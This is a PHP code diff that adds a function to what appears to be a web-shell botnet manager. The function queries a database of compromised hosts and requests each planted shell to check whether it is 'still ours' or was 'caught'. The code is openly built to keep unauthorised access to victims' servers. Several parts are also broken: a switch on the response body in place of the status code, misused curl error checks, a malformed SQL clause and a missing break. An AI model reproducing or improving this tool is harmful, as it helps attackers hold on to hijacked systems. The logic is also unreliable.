@@ -170,6 +170,65 @@ function aHo($host)
 
 function check($host, $path, $batch)
 {
+    if (!empty($batch)){
+        switch ($batch){
+            case "y":
+                $c = pg_exec(DBCONN, "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL OR NOT '-'");
+                $count = pg_exec(DBCONN, 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
+                echo "Pulling: ". pg_fetch_row($count)."\nThis could take awhile.";
+                curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
+                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
+                curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
+                foreach (pg_fetch_all($c) as $r){
+                    if (!empty($r)){
+                        curl_setopt(CHH, CURLOPT_URL,                "$r[0]/$r[1]?qs=cqS");
+                        $syst = curl_exec(CHH);
+                        if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
+                            switch ($syst){
+                                case 200:
+                                    echo "Host is still ours!\n";
+                                    break;
+                                case 404:
+                                    echo "Looks like our shell was caught... sorry..\n";
+                                    break;
+                                case 500:
+                                    echo "Your useragent was not the correct one... did you forget??\n";
+                                    break;
+                                default:
+                                    echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
+                                    break;
+                            }
+                        }
+
+                    }
+                }
+            case "n":
+                if (!empty($host) && !empty($path)){
+                    curl_setopt(CHH, CURLOPT_URL,                "$host/$path?qs=cqS");
+                    curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
+                    curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
+                    curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
+                    $syst = curl_exec(CHH);
+                    if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
+                        switch ($syst){
+                            case 200:
+                                echo "Host is still ours!\n";
+                                break;
+                            case 404:
+                                echo "Looks like our shell was caught... sorry..\n";
+                                break;
+                            case 500:
+                                echo "Your useragent was not the correct one... did you forget??\n";
+                                break;
+                            default:
+                                echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
+                                break;
+                        }
+                    }
+                }
+        }
+
+    }
 
 }
 
